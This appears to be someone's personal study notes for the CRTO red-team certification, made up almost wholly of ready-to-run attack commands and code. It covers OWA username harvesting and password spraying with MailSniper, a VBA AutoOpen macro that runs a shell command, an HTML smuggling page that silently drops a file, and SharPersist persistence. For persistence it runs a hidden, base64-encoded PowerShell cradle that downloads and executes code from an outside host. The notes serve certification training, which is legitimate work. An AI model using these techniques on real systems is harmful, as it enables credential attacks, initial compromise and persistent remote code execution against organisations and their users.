# CRTO
Mi own notes to pass the CRTO

# Initial Compromise

## Mail Sniper

Import the Module

```
ipmo C:\Tools\MailSniper\MailSniper.ps1
```

Check the valid usernames

```
Invoke-UsernameHarvestOWA -ExchHostname mail.domain.local -Domain domain.local -UserList possible_users.txt -OutFile valid.txt
```

Password Spraying

```
Invoke-PasswordSprayOWA -ExchHostname mail.domain.local -UserList valid.txt -Password Password
```

Dump all email accounts

```
Get-GlobalAddressList -ExchHostname mail.domain.local -UserName domain.local\user -Password Password -OutFile users.txt
```

## Visual Basic for Application (Macros)

```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "COMMAND"

End Sub
```

## HTML Smuggling

```
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```

# Host Persistence con SharPersist

## Task Scheduler

Encodear el payload

```
$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
```
```
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```
Configuration of the Host Persistence
```
execute-assembly SharPersist.exe -t [schtask | reg | startupfolder] -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc PAYLOAD_ENCODEADO" -n "TASK_NAME" -m add -o [hourly | daily | logon] [-f "filename"] [-k "REGISTRY_KEY_TO_MODIFIE" -v "REGISTRY_KEY_TO_CREATE"]
```
